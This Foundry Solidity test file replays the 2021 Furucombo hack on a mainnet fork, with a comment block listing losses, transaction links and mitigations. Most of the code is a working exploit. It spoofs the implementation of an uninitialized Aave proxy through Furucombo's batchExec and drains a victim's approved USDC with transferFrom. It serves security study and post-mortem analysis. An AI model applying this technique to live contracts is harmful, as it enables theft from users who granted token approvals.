// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from '../../interfaces/IWETH9.sol';

// forge test --match-contract Exploit_Furucombo -vvv
/*
On Feb 27, 2021 an attacker stole over ~$15MM in multiple tokens from uses who gave max approval to Furucombo.
The attacker initialized a malicious contract spoofing as a new implementation of AaveV2 abusing the previously gave allowance to Furucombo.

// Attack Overview
Total Lost: 
3,9k stETH
2.4M USDC
649k USDT
257k DAI
26 aWBTC
270 aWETH
296 aETH
2.3k aAAVE
4 WBTC
90k CRV
43k LINK
7.3k cETH
17.2M cUSDC
69 cWBTC
142.2M BAO
38.6k PERP
30.4k COMBO
75k PAID
225k UNIDX
342 GRO
19k NDX

Initialization: https://etherscan.io/tx/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449
Ethereum Transaction Viewer - Initialization: https://tx.eth.samczsun.com/ethereum/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449

Attack: https://etherscan.io/tx/0x8bf64bd802d039d03c63bf3614afc042f345e158ea0814c74be4b5b14436afb9
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x8bf64bd802d039d03c63bf3614afc042f345e158ea0814c74be4b5b14436afb9


Exploited Contract: https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f
Attacker Address: https://etherscan.io/address/0xb624e2b10b84a41687caec94bdd484e48d76b212
Attacker Contract: https://etherscan.io/address/0x86765dde9304bEa32f65330d266155c4fA0C4F04
Attack Block: 11940500 

// Key Info Sources
Twitter: https://twitter.com/furucombo/status/1365743633605959681
Writeup: https://slowmist.medium.com/slowmist-analysis-of-the-furucombo-hack-28c9ae558db9
Writeup: https://github.com/OriginProtocol/security/blob/master/incidents/2021-02-27-Furucombo.md
Article: https://github.com/MrToph/replaying-ethereum-hacks/blob/master/test/furucombo.ts


Principle: Non Initialized Proxy Spoof

ATTACK:
The attacker detected a non initialized proxy implementation and deceived Furucombo's Proxy to interpret that the implementaiton of AaveV2 proxy was modified. This was
also possible because the non initialized proxy was already included into the whitelisted contracts. A malicious implementation was passed instead (being the attacker's contract) 
that performed a transferFrom the users who gave approval to Furucombo. Because the calls were triggered by a delegation chain, the sender of the transferFrom was 
Fucucombo (the approved) executing the logic of the malicious contract.

MITIGATIONS:
1) Initialize upgradable contracts.
2) Prevent delegatecalls that could maliciously initialize the upgradable contracts.
3) If the protocol use a whitelist to filter transactions, add only operative and already fully configured contracts to that whitelist ensuring that they work as intended.

*/

interface IRegistry {
    function infos(address) external view returns (bytes32);

    function isValid(address handler) external view returns (bool result);
}

/**
 * @title The entrance of Furucombo
 * @author Ben Huang
 */
interface IProxy {
    /**
     * @notice Combo execution function. Including three phases: pre-process,
     * exection and post-process.
     * @param tos The handlers of combo.
     * @param configs The configurations of executing cubes.
     * @param datas The combo datas.
     */
    function batchExec(
        address[] memory tos,
        bytes32[] memory configs,
        bytes[] memory datas
    ) external;
}

// https://etherscan.io/address/0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9#code
interface IAaveV2Proxy {
    function initialize(address _logic, bytes memory _data) external payable;
}

contract Exploit_Furucombo is TestHarness, TokenBalanceTracker {
    address internal victim = 0x13f6f084e5fadED2276def5149E71811A7AbEb69;

    IProxy internal furucomboProxy = IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy internal aaveV2Proxy = IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // From deployment constructor https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f#code
    IRegistry internal furucomboRegistry = IRegistry(0xd4258B13C9FADb7623Ca4b15DdA34b7b85b842C7);

    address attacker = address(0x69);

    function setUp() external {
        cheat.createSelectFork("mainnet", 11940499); 

        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdc));

        logBalancesWithLabel('Attacker', tx.origin);
        updateBalanceTracker(address(this));
        updateBalanceTracker(victim);

    }

    function test_attack() external {
        uint256 balanceBefore = usdc.balanceOf(tx.origin);

        // Check that the malicious implementation is not valid (yet)
        console.log("Check if Aave Proxy is valid initially:", furucomboRegistry.isValid(address(aaveV2Proxy)));
        console.log("Check victims allowance:", usdc.allowance(victim, address(furucomboProxy)));
        console.log("\n");

        console.log("==== STEP 1: Initialize this as proxy ====");
        address[] memory tos = new address[](1);
        tos[0] = address(aaveV2Proxy);

        bytes32[] memory configs = new bytes32[](1);

        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            aaveV2Proxy.initialize.selector,
            address(this),
            ""
        );

        furucomboProxy.batchExec(tos, configs, datas);

        logBalancesWithLabel('Attacker', tx.origin);
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Victim', victim);

        console.log("==== STEP 2: Execute Attack (transferFrom) ====");
        
        executeTransferFrom();
        logBalancesWithLabel('Attacker', tx.origin);
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Victim', victim);

        uint256 balanceAfter = usdc.balanceOf(tx.origin);
        assertGe(balanceAfter, balanceBefore);
    }

    function executeTransferFrom() internal {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            this.doTransferFrom.selector,
            usdc,
            victim
        );
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.fallback
        // which delegatecalls again to its implementation address
        // which was changed in setup to "this"
        // meaning furucombo delegatecalls to this.attackDelegated
        furucomboProxy.batchExec(tos, configs, datas);
    }

    function doTransferFrom(IERC20 token, address sender) external payable {
        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
    }
}
